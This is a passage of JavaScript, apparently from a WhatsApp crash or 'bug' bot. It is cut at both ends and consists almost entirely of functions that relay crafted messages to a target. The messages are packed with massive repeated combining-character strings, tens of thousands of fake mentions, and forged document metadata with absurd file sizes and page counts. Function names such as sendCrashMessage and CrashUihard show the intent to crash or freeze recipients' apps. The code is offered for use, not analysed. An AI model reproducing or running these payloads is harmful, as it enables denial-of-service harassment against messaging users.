									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["2348127187030@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
async function systemUi(target, Ptcp = false) {
    cella.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝕱𝖆𝖒𝖟𝖞𝖃𝖙𝖗𝖊𝖒𝖊 ❤️‍🔥" + "ꦾ".repeat(250000) + "@1".repeat(120000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
};
async function sendCrashMessage(target, quoted = false) {
      const spamText = "_*~@2348146895993~*_\n".repeat(10200);
      const crashText = "ꦽ".repeat(1500);
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "Crash Ui" + crashText + spamText,
                },
                contextInfo: {
                  mentionedJid: ["2348146895993@s.whatsapp.net"],
                  mentions: ["2348146895993@s.whatsapp.net"],
                },
                footer: {
                  text: "",
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: [
                    "2348146895993@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "2348146895993@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        quoted
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }
async function CrashUihard(target, options = false) {
      const spamMessage = "_*~@2348146895993~*_\n".repeat(10200);
      const crashMessage = "ꦽ".repeat(10200);
      cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              extendedTextMessage: {
                text: "'?" + spamMessage,
                previewType: "ŦΛMZЏϾЯΛSH",
                contextInfo: {
                  mentionedJid: [
                    "2348146895993@s.whatsapp.net",
                    "2348146895993@s.whatsapp.net",
                  ],
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "lopyu" + spamMessage + crashMessage,
                },
                footer: {
                  text: "",
                },
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                    fileLength: null,
                    pageCount: 99999999999999,
                    contactVcard: true,
                    caption: "ŦΛMZЏϾЯΛSH",
                    mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                    fileName: "ŦΛMZЏϾЯΛSH ",
                    fileEncSha256:
                      "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                    directPath:
                      "/text/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1714145232",
                    thumbnailDirectPath:
